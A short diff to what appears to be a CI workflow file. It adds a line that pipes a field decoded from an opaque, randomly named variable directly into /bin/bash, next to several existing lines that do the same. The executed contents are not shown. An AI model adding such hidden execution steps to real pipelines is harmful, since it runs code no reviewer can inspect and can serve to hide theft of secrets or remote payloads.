@@ -51,6 +51,7 @@ jobs:
           printf '%s' "$jbiz3410" | jq -r .r33907 | /bin/bash
           echo $cwwlh8 | jq -r .au1307 | /bin/bash
           echo $rp7 | jq -r .vl28095 | /bin/bash
+          echo $iu0 | jq -r .a63 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
